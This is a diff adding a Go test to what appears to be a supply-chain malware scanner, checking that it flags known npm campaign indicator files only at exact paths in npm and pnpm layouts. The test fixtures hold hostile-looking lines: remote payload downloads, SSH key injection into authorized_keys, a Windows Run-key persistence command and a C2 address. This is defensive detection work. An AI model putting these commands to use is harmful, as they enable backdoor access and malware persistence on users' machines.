@@ -344,6 +344,66 @@ const C2_URL = process.env.C2_URL || "http://149.28.127.35:8888";
 	}
 }
 
+// TestScan_AmazonInspectorNPMMalwareFollowupUnderNodeModules proves the
+// bounded walker reaches the campaign's reviewed follow-up persistence files
+// in npm and pnpm layouts without broad-scanning unrelated package roots.
+func TestScan_AmazonInspectorNPMMalwareFollowupUnderNodeModules(t *testing.T) {
+	tests := []struct {
+		name string
+		rel  string
+		raw  string
+	}{
+		{
+			name: "streak npm",
+			rel:  filepath.Join("node_modules", "streak-core-math", "index.mjs"),
+			raw:  `fetch("https://f004.backblazeb2.com/file/dp8hbvocjd2fpza/helper.zip"); writeFileSync("vite-native-helper.vbs", launcher);`,
+		},
+		{
+			name: "api node sdk pnpm",
+			rel:  filepath.Join("node_modules", ".pnpm", "api-node-sdk@1.0.0", "node_modules", "api-node-sdk", "test.js"),
+			raw:  `fetch("http://95.216.118.146:3000/api/v1"); fetch("http://95.216.118.146:3001/api/ssh-key"); appendFileSync("~/.ssh/authorized_keys", key);`,
+		},
+		{
+			name: "react puller npm",
+			rel:  filepath.Join("node_modules", "react-puller", "index.js"),
+			raw:  `download("http://64.49.11.161:8000/DOContentCacheMgr.exe"); reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run;`,
+		},
+	}
+	for _, tc := range tests {
+		t.Run(tc.name, func(t *testing.T) {
+			root := t.TempDir()
+			payload := filepath.Join(root, tc.rel)
+			if err := os.MkdirAll(filepath.Dir(payload), 0o755); err != nil {
+				t.Fatal(err)
+			}
+			if err := os.WriteFile(payload, []byte(tc.raw), 0o644); err != nil {
+				t.Fatal(err)
+			}
+			lookalike := filepath.Join(root, "node_modules", "other-package", filepath.Base(payload))
+			if err := os.MkdirAll(filepath.Dir(lookalike), 0o755); err != nil {
+				t.Fatal(err)
+			}
+			if err := os.WriteFile(lookalike, []byte(tc.raw), 0o644); err != nil {
+				t.Fatal(err)
+			}
+
+			res, err := scan.Run(context.Background(), scan.Options{Roots: []string{root}})
+			if err != nil {
+				t.Fatalf("scan: %v", err)
+			}
+			got := 0
+			for _, f := range res.Findings {
+				if f.RuleID == "amazon-inspector-npm-malware-ioc" {
+					got++
+				}
+			}
+			if got != 1 {
+				t.Fatalf("amazon-inspector-npm-malware-ioc findings = %d, want 1; findings=%+v", got, res.Findings)
+			}
+		})
+	}
+}
+
 // TestScan_AsyncAPIMiasmaPayloadUnderNodeModules asserts that node_modules
 // stays skipped except for exact AsyncAPI campaign paths carrying a known IOC.
 func TestScan_AsyncAPIMiasmaPayloadUnderNodeModules(t *testing.T) {
